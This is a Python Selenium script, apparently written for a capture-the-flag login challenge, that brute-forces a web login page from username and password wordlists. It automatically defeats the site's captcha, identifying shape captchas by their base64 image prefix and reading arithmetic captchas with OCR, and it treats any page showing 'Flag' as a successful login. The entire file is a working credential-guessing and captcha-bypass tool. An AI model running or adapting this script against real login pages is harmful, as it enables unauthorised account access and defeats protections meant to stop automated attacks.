
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import base64
import pytesseract
from PIL import Image
import re
import time
import io

# Setup
url = "http://<IP>/login"
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"

# Configure Firefox browser
options = Options()
options.set_preference("detach", True)  # Keeps browser open after script ends
# options.add_argument("--headless")  # Uncomment to run in headless mode

browser = webdriver.Firefox(options=options)


def extract_base64_string(img_src):
    if "base64," in img_src:
        return img_src.split("base64,")[1]
    return None


def detect_captcha_type(base64_string):
    if base64_string.startswith("iVBORw0KGgoAAAANSUhEUgAAAHgAAAB2"):
        return "shape", "circle"
    elif base64_string.startswith("iVBORw0KGgoAAAANSUhEUgAAAHgAAABo"):
        return "shape", "triangle"
    elif base64_string.startswith("iVBORw0KGgoAAAANSUhEUgAAAHgAAABv"):
        return "shape", "square"
    else:
        return "math", None


def solve_math_captcha(base64_string):
    img_data = base64.b64decode(base64_string)
    img = Image.open(io.BytesIO(img_data))
    img.save("captcha_math.png")
    text = pytesseract.image_to_string(img)
    print(f"Extracted math expression: {text.strip()}")

    equation = text.split("=")[0].strip()
    match = re.match(r"(\d+)\s*([+\-*/])\s*(\d+)", equation)
    if match:
        num1, op, num2 = int(match.group(1)), match.group(2), int(match.group(3))
        if op == "+":
            return str(num1 + num2)
        elif op == "-":
            return str(num1 - num2)
        elif op == "*":
            return str(num1 * num2)
        elif op == "/":
            return str(num1 // num2)
    return None


def solve_captcha():
    try:
        img_element = browser.find_element(By.TAG_NAME, "img")
        src = img_element.get_attribute("src")
        base64_string = extract_base64_string(src)
        if not base64_string:
            print("[-] Failed to extract base64 string.")
            return None

        captcha_type, shape_answer = detect_captcha_type(base64_string)
        if captcha_type == "shape":
            print(f"[Captcha] Shape detected: {shape_answer}")
            return shape_answer
        else:
            print("[Captcha] Math detected.")
            return solve_math_captcha(base64_string)
    except Exception as e:
        print(f"Error solving captcha: {e}")
        return None


def attempt_login(username, password):
    browser.get(url)
    browser.find_element(By.NAME, "username").send_keys(username)
    browser.find_element(By.NAME, "password").send_keys(password)
    browser.find_element(By.TAG_NAME, "button").click()
    time.sleep(2)

    captcha_round = 1

    while "captcha" in browser.page_source.lower():
        print(f"[*] Captcha page triggered (Round {captcha_round}).")
        try:
            captcha_input = browser.find_element(By.NAME, "captcha")
            captcha_input.clear()  # Clear previous input
            captcha_answer = solve_captcha()
            if captcha_answer:
                captcha_input.send_keys(captcha_answer)
                browser.find_element(By.TAG_NAME, "button").click()
                time.sleep(1)
            else:
                print("[-] Could not solve captcha.")
                return False
        except Exception as e:
            print(f"[-] Captcha handling error: {e}")
            return False

        captcha_round += 1

    if "Flag.txt" in browser.page_source or "Flag" in browser.page_source:
        print(f"[+] SUCCESS! Logged in as {username}:{password}")
        return True

    return False


def brute_force_login():
    with open(usernames_file) as uf:
        usernames = [line.strip() for line in uf]

    with open(passwords_file) as pf:
        passwords = [line.strip() for line in pf]

    for username in usernames:
        print(f"\n=== Trying username: {username} ===")
        for i in range(0, len(passwords), 3):
            for j in range(i, min(i + 3, len(passwords))):
                password = passwords[j]
                print(f"[Attempt] {username}:{password}")
                if attempt_login(username, password):
                    return

    print("[-] Brute-force complete. No valid credentials found.")


if __name__ == "__main__":
    brute_force_login()
